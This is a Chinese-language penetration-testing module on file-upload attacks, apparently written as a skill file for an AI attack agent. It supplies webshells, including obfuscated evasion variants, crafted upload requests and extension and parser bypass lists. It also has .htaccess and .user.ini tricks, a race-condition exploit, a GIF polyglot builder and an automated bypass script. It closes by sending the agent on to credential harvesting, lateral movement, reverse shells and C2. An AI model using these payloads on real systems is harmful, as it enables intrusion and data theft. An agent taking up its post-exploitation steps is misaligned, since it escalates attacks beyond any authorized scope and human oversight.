# 📤 文件上传模块

## 适用场景
- 头像、附件上传功能
- 图片/文件处理接口
- 任何文件上传入口

## 检查清单

```yaml
检测点:
  - [ ] 前端 JS 验证
  - [ ] Content-Type 验证
  - [ ] 文件后缀验证
  - [ ] 文件头验证
  - [ ] 文件内容检测
  - [ ] 二次渲染

绕过技巧:
  - [ ] 修改后缀大小写
  - [ ] 双写后缀
  - [ ] 特殊后缀
  - [ ] .htaccess 利用
  - [ ] .user.ini 利用
  - [ ] 解析漏洞

最终目标:
  - [ ] 上传 WebShell
  - [ ] 代码执行
  - [ ] 任意文件覆盖
```

## 分析流程

### Step 1: 前端验证绕过

```javascript
// 前端验证通常在 JS 中
// 方法1: 禁用 JavaScript
// 方法2: 修改 JS 代码
// 方法3: 直接发送 HTTP 请求，绕过前端

// 使用 Burp Suite 直接构造请求
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxx

------xxx
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST['cmd']); ?>
------xxx--
```

### Step 2: Content-Type 验证绕过

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxx

------xxx
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php @eval($_POST['cmd']); ?>
------xxx--

# 或者使用
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: application/octet-stream
```

### Step 3: 后缀名绕过

```yaml
黑名单绕过:
  大小写:
    - shell.pHp
    - shell.Php
    - shell.PHP
    
  双写:
    - shell.pphphp
    - shell.phphpp
    
  特殊字符:
    - shell.php.
    - shell.php::$DATA  (Windows NTFS)
    - shell.php%00.jpg  (空字节截断)
    - shell.php%20
    - shell.php\x00.jpg
    
  特殊后缀:
    PHP: php, php3, php4, php5, php7, phtml, pht, phps, phar
    ASP: asp, aspx, asa, cer, cdx
    JSP: jsp, jspx, jspa, jsw, jsv, jtml
    
  Apache解析:
    - shell.php.xxx  (只要xxx未定义，按php解析)
    - shell.php.jpg
    - .htaccess

白名单绕过:
  - 00截断 (PHP < 5.3.4, GPC off)
  - 条件竞争
  - 解析漏洞
  - 配合文件包含
```

### Step 4: 文件头绕过

```php
// GIF
GIF89a<?php @eval($_POST['cmd']); ?>

// PNG (添加 PNG 文件头)
\x89PNG\r\n\x1a\n<?php @eval($_POST['cmd']); ?>

// JPEG (添加 JPEG 文件头)
\xff\xd8\xff\xe0<?php @eval($_POST['cmd']); ?>

// 图片马制作
copy /b normal.jpg + shell.php shell.jpg  // Windows
cat normal.jpg shell.php > shell.jpg      // Linux

// exiftool 写入 payload
exiftool -Comment='<?php @eval($_POST[cmd]); ?>' image.jpg
```

### Step 5: .htaccess 利用

```apache
# .htaccess 内容 - 方法1: 将 jpg 解析为 php
AddType application/x-httpd-php .jpg

# .htaccess 内容 - 方法2: 指定文件解析为 php
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>

# .htaccess 内容 - 方法3: 自动添加 php 代码
php_value auto_prepend_file "shell.jpg"

# .htaccess 内容 - 方法4: 上传目录禁用安全设置
php_flag engine on
```

### Step 6: .user.ini 利用

```ini
; .user.ini 内容
; 需要目录下有 php 文件（如 index.php）

; 方法1: 自动加载文件
auto_prepend_file = shell.jpg

; 方法2: 自动追加文件
auto_append_file = shell.jpg

; 利用步骤
; 1. 上传 .user.ini
; 2. 上传 shell.jpg（包含 PHP 代码）
; 3. 访问目录下的任意 php 文件，自动包含 shell
```

### Step 7: 解析漏洞

```yaml
Apache:
  多后缀解析:
    - shell.php.xxx → 解析为 php
    - 原理: 从右向左解析，遇到不认识的后缀继续向左
    
  .htaccess:
    - 上传 .htaccess 使任意文件解析为 php

Nginx:
  空字节截断 (CVE-2013-4547):
    - shell.jpg%20%00.php
    
  路径解析漏洞:
    - /uploads/shell.jpg/xxx.php
    - /uploads/shell.jpg%00.php
    
  配置错误:
    - location ~ \.php$ { ... }
    - shell.jpg/.php 可能触发解析

IIS:
  目录解析 (IIS 6.0):
    - /test.asp/shell.jpg → 解析为 asp
    
  分号截断 (IIS 6.0):
    - shell.asp;.jpg → 解析为 asp
    
  PUT 方法:
    - 直接 PUT 上传 shell

Tomcat:
  PUT 方法 + 空字节:
    - PUT /shell.jsp%00.txt → 成功写入 shell.jsp
```

### Step 8: 条件竞争

```python
#!/usr/bin/env python3
"""
条件竞争上传利用
原理: 在文件被删除之前访问执行
"""

import requests
import threading

url = "http://target.com/upload.php"
shell_url = "http://target.com/uploads/shell.php"

# WebShell 内容
shell = "<?php fputs(fopen('real_shell.php','w'),'<?php @eval($_POST[1]); ?>'); ?>"

def upload():
    """持续上传"""
    files = {'file': ('shell.php', shell)}
    while True:
        try:
            requests.post(url, files=files, timeout=1)
        except:
            pass

def access():
    """持续访问"""
    while True:
        try:
            resp = requests.get(shell_url, timeout=1)
            if resp.status_code == 200:
                print("[+] Shell executed!")
                print("[+] Check: http://target.com/uploads/real_shell.php")
                return True
        except:
            pass

# 启动上传线程
for i in range(10):
    t = threading.Thread(target=upload)
    t.daemon = True
    t.start()

# 启动访问线程
for i in range(10):
    t = threading.Thread(target=access)
    t.daemon = True
    t.start()

# 等待
import time
time.sleep(60)
```

### Step 9: 二次渲染绕过

```python
#!/usr/bin/env python3
"""
二次渲染绕过 - 图片马
GIF 在二次渲染后仍保留的位置写入 payload
"""

# GIF 二次渲染绕过
# 在 GIF 文件特定位置插入代码

def create_gif_shell():
    """创建绕过二次渲染的 GIF 马"""
    # GIF89a 标准头部
    gif_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00'
    # 全局颜色表
    gif_color = b'\xff\xff\xff\x00\x00\x00'
    # 图像描述符
    gif_image = b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'
    # 图像数据
    gif_data = b'\x02\x02\x44\x01\x00'
    # GIF 结尾
    gif_end = b'\x3b'
    
    # PHP 代码
    php_code = b'<?php @eval($_POST["cmd"]); ?>'
    
    # 在注释块中插入 PHP 代码
    comment_block = b'\x21\xfe' + bytes([len(php_code)]) + php_code + b'\x00'
    
    # 组合
    gif = gif_header + gif_color + comment_block + gif_image + gif_data + gif_end
    
    with open('shell.gif', 'wb') as f:
        f.write(gif)
    
    print("[+] Created shell.gif")

# PNG 二次渲染绕过
# 使用 IDAT 块存储 payload


# JPEG 二次渲染绕过
# 在 JFIF APP0 段或 EXIF 段存储
```

## 常见 WebShell

```php
// 一句话木马
<?php @eval($_POST['cmd']); ?>
<?php @eval($_REQUEST['cmd']); ?>
<?php @eval($_GET['cmd']); ?>

// system 执行
<?php @system($_POST['cmd']); ?>
<?php @passthru($_POST['cmd']); ?>
<?php @shell_exec($_POST['cmd']); ?>

// assert (PHP < 7.2)
<?php @assert($_POST['cmd']); ?>

// 免杀马
<?php $a='ass'; $b='ert'; $c=$a.$b; $c($_POST['cmd']); ?>
<?php $_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;...?>

// 图片马头部
GIF89a<?php @eval($_POST['cmd']); ?>

// 极简版
<?=`$_GET[1]`?>
<?=`$_POST[1]`?>
<?=@$_GET[1]($_GET[2])?>
```

## 常见套路与解法

### 套路 1: 黑名单过滤

**特征**: 过滤 php 等常见后缀

**解法**:
- 大小写: `.Php`, `.pHp`
- 特殊后缀: `.php3`, `.php5`, `.phtml`
- 双写: `.pphphp`
- 点绕过: `.php.` (Windows)

### 套路 2: 白名单限制

**特征**: 只允许图片后缀

**解法**:
- 00 截断 (PHP < 5.3.4)
- 配合文件包含
- 解析漏洞
- .htaccess 利用

### 套路 3: 内容检测

**特征**: 检测 `<?php` 等关键字

**解法**:
- 短标签: `<?=`
- 大小写: `<?PHP`
- 编码: `<script language="php">`

### 套路 4: 二次渲染

**特征**: 图片被重新处理

**解法**:
- 使用特殊位置保存 payload
- 对比渲染前后，找不变区域

## 自动化脚本

```python
#!/usr/bin/env python3
"""
文件上传测试脚本
"""

import requests

url = "http://target.com/upload.php"

# WebShell 内容
shell = "<?php @eval($_POST['cmd']); ?>"
gif_shell = "GIF89a" + shell

# 测试用例
test_cases = [
    # 原始后缀
    {"filename": "shell.php", "content": shell, "content_type": "application/x-php"},
    
    # 大小写绕过
    {"filename": "shell.pHp", "content": shell, "content_type": "application/x-php"},
    {"filename": "shell.Php", "content": shell, "content_type": "application/x-php"},
    
    # 特殊后缀
    {"filename": "shell.php3", "content": shell, "content_type": "application/x-php"},
    {"filename": "shell.php5", "content": shell, "content_type": "application/x-php"},
    {"filename": "shell.phtml", "content": shell, "content_type": "application/x-php"},
    
    # Content-Type 绕过
    {"filename": "shell.php", "content": shell, "content_type": "image/jpeg"},
    {"filename": "shell.php", "content": shell, "content_type": "image/png"},
    
    # 文件头绕过
    {"filename": "shell.php", "content": gif_shell, "content_type": "image/gif"},
    
    # 点绕过
    {"filename": "shell.php.", "content": shell, "content_type": "application/x-php"},
    
    # .htaccess
    {"filename": ".htaccess", "content": "AddType application/x-httpd-php .jpg", "content_type": "text/plain"},
    
    # .user.ini
    {"filename": ".user.ini", "content": "auto_prepend_file=shell.jpg", "content_type": "text/plain"},
]

def test_upload():
    """测试各种绕过方式"""
    for i, test in enumerate(test_cases):
        files = {
            'file': (test['filename'], test['content'], test['content_type'])
        }
        
        try:
            resp = requests.post(url, files=files, timeout=5)
            
            if resp.status_code == 200 and 'success' in resp.text.lower():
                print(f"[+] Success: {test['filename']} (Content-Type: {test['content_type']})")
            else:
                print(f"[-] Failed: {test['filename']}")
                
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == '__main__':
    test_upload()
```

## 工具速查

```bash
# 图片马制作
copy /b image.jpg + shell.php shell.jpg  # Windows
cat image.jpg shell.php > shell.jpg      # Linux

# exiftool 注入
exiftool -Comment='<?php @eval($_POST[cmd]); ?>' image.jpg
```

---

## 下一步：Webshell 获得后

> **上传 Webshell 成功后，立即进入后渗透流程：**
> 1. 加载 `Skill("infra-exploit")` — 后渗透环境检测、凭据收割、横向移动
> 2. 升级 Webshell 为反弹 Shell？参考 `infra-exploit/modules/pivot-tunneling.md` §1
> 3. 发现内网网段？参考 `infra-exploit/modules/pivot-tunneling.md` — 隧道建立、内网渗透
> 4. 需要 Metasploit/meterpreter？请求 Orchestrator 调度 `Task[c2]`
> 5. **不要停留在 Webshell 上逐个 curl 内网服务** — 先建隧道，再用专业工具批量扫
